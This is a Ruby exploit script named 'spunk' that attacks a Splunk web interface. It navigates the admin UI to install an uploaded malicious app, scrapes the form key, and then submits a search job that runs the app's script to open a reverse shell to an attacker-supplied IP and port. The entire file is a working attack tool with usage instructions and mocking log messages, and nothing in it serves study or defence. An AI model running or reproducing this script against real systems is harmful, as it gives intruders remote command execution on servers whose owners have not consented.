#!/usr/bin/env ruby

require 'mechanize'
require 'logger'

@debug = true

def banner
  print <<EOF
                                    888      Y88b                d8b d8b 
                                    888       Y88b               88P 88P 
                                    888        Y88b              8P  8P  
.d8888b  88888b.  888  888 88888b.  888  888    Y88b             "   "   
88K      888 "88b 888  888 888 "88b 888 .88P    d88P                     
"Y8888b. 888  888 888  888 888  888 888888K    d88P  888888 888888       
     X88 888 d88P Y88b 888 888  888 888 "88b  d88P                       
 88888P' 88888P"   "Y88888 888  888 888  888 d88P                        
         888                                                             
         888                                                             
         888  

EOF
end

def usage
  puts "spunk <splunk base url> <spunkapp tgz> <reverse shell target ip> <reverse shell target port>"
end

def log(message)
  puts "[*] #{message}" if @debug
end

# check we've got the number of args we need
unless ARGV.length == 4
  usage
  exit
end

# get our target details
host = ARGV.shift
spunk_app = ARGV.shift
rhost = ARGV.shift
rport = ARGV.shift

# define our urls
search_url = host + '/en-US/app/search/flashtimeline'
spunk_url = host + '/en-US/app/spunk/flashtimeline'
jobs_url = host + '/en-US/api/search/jobs'

# set up the mechanize browser
agent = Mechanize.new { |a| 
  a.log = Logger.new(STDOUT)
  a.log.level = Logger::ERROR
}

# print our ascii art :-)
banner

# now we get started
# request the search_url in order to get a cookie
begin
  agent.get(search_url) do |splash_page|
    # click on the continue button if we have one
    log "connecting to splunk> instance"
    home_page = agent.click(splash_page.link_with(:text => /Continue/))

    # now go to the manage apps page
    log "navigating to manage apps"
    manage_apps_page = agent.click(home_page.link_with(:text => /Apps/))

    # click the install app from file link
    log "navigating to install app from file"
    install_app_page = agent.click(manage_apps_page.link_with(:text => /Install\ app\ from\ file/))

    # upload our file
    log "uploading spunk app"
    install_app_page.form_with(:method => 'POST') do |upload_form|
      upload_form.file_uploads.first.file_name = spunk_app
    end.submit

  end
rescue => e
  puts "meh, #{e}"
  exit
end

begin
    log "retrieving form key"
    # first we need to retrieve the form key
    # FORM_KEY": "463764128146385915
    @form_key = ""
    agent.get(spunk_url) do |spunk|
      spunk.body.match(/FORM_KEY":\ "(\d+)"/)
      @form_key = $1
    end

    splunk_headers = { 'X-Requested-With' => 'XMLHttpRequest',
                       'X-Splunk-Form-Key' => @form_key }

    log "triggering reverse shell"
    # now we pwn it softly
    agent.post(jobs_url, {
        :search => "search foo | script pwn #{rhost} #{rport}",
        :status_buckets => "300",
        :namespace => "spunk",
        :ui_dispatch_app => "spunk",
        :ui_dispatch_view => "flashtimeline",
        :auto_cancel => "100",
        :required_field_list => "*",
        :earliest_time => "0",
        :latest_time => "",
        :timeFormat => "%s.%Q"
        },
        splunk_headers)

    log "spunked all over it"

rescue => e
  puts "oh bugger, #{e}"
end
